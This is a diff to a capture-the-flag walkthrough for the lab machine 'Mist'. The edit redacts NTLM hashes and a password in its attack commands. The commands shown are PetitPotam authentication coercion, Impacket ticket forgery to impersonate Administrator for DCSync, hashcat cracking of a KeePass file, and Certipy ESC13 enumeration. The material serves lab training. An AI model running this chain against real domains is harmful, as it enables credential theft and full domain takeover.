@@ -281,7 +281,7 @@ Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corpo
 [*] Setting up RAW Server on port 6666
 ```
 ```bash
-proxychains petitpotam.py -u "Brandon.Keywarp" -d mist.htb -hashes :DB03D6A77A2205BC1D07082740626CC9 "ms01@8082/test" 192.168.100.101 -pipe all
+proxychains petitpotam.py -u "Brandon.Keywarp" -d mist.htb -hashes :DB[...]C9 "ms01@8082/test" 192.168.100.101 -pipe all
 ```
 
 ![alt text](<../assets/image_mist/5er MS01 success auth.png>)
@@ -323,7 +323,7 @@ d0[...]26
 Now we need to impersonate Administrator to DCSync because MS01$ can't :
 
 ```bash
-proxychains -q ticketer.py -nthash d0db4014a7dff4c5592ae28ba6c0d326 -domain-sid S-1-5-21-1045809509-3006658589-2426055941 -domain mist.htb -dc-ip 192.168.100.100 -spn HOST/MS01.mist.htb administrator
+proxychains -q ticketer.py -nthash d0[...]26 -domain-sid S-1-5-21-1045809509-3006658589-2426055941 -domain mist.htb -dc-ip 192.168.100.100 -spn HOST/MS01.mist.htb administrator
 Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation
 
 [*] Creating basic skeleton ticket and PAC Infos
@@ -362,10 +362,8 @@ Ok so we have a hint about the password of Sharon.Mullard
 Let's try to crack it with hashcat, first convert the .kdbx with ```keepass2john``` and crack it with ```hashcat```
 
 ```bash
-hashcat --attack-mode 3 --increment --hash-type 13400 sharon.hash 'UA7cpa[#1!_*ZX@?a?a?a?a?a?a?a?a'
+hashcat --attack-mode 3 --increment --hash-type 13400 sharon.hash 'UA7cpa[#1!_*ZX?a?a?a?a?a?a?a?a'
 ```
-And we got something like that ```UA[...]X@```
-
 Open the .kdbx and get the password of Sharron.Mullard
 
 Now we can test the password on ```op_Sharon.Mullard```
@@ -428,7 +426,7 @@ LDAP        192.168.100.100 389    DC01             [+] mist.htb\svc_cabackup:c9
 Ok now we gonna abuse ESC13, for this we can use [this PR](https://github.com/ly4k/Certipy/pull/196)
 
 ```bash
-proxychains -q python3 entry.py find -u "OP_SHARON.MULLARD" -p 'ImTiredOfThisJob:(' -dc-ip 192.168.100.100 -debug
+proxychains -q python3 entry.py find -u "OP_SHARON.MULLARD" -p 'REDACTED' -dc-ip 192.168.100.100 -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [+] Authenticating to LDAP server
